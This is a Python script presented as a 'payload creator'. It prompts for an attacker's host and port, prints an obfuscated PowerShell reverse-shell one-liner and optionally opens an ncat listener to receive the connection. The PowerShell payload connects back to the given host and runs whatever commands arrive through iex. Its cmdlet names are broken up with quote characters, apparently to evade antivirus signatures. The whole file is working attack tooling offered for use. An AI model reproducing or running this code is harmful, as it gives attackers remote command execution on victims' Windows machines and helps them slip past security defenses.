import socket
import subprocess
import os

print('----------------------------------------------------------')
print('''
 @@@@@@@@   @@@@@@   @@@@@@@   @@@@@@@@@@   
@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  
!@@        @@!  @@@  @@!  @@@  @@! @@! @@!  
!@!        !@!  @!@  !@!  @!@  !@! !@! !@!  
!@! @!@!@  @!@!@!@!  @!@!!@!   @!! !!@ @!@  
!!! !!@!!  !!!@!!!!  !!@!@!    !@!   ! !@!  
:!!   !!:  !!:  !!!  !!: :!!   !!:     !!:  
:!:   !::  :!:  !:!  :!:  !:!  :!:     :!:  
 ::: ::::  ::   :::  ::   :::  :::     ::   
 :: :: :    :   : :   :   : :   :      :     ''')
print('')
print('The best of all Payload Creators')
print('')
print('Created by 0D1nss0n')
print('')
print('----------------------------------------------------------')
print('')

lhost = input('Enter the local host IP address: ')
lport = input('Enter the local port number: ')

def generate_powershell_command(lhost, lport):
    # generate the PowerShell command
    print('')
    print('PowerShell Payload Created')
    powershell_command = "$client = N''ew-O'bje'ct System.Net.Sockets.TCPClient('" + lhost + "'," + str(lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N'e'w-Obje''ct -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i'e'x $data 2>&1 | O'u't-'S'tr'in'g );$sendback2 = $sendback + '<:Garm:> ' + (p'w'd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    # print the PowerShell command
    print('')
    print(powershell_command)


generate_powershell_command(lhost, int(lport))

def start_listener(lhost, lport):
    # Prompt the user if they want to start a listener
    print('')
    listener = input('Do you want to start a listener on ' + lhost + ':' + str(lport) + '?(y/n): ')

    if listener == 'y':
        # Build the command to start ncat listener
        command = f"gnome-terminal --hide-menubar -- ncat -lvnp {lport}"
        
        # Run the command in a new terminal window
        subprocess.Popen(command.split())

start_listener(lhost, int(lport))
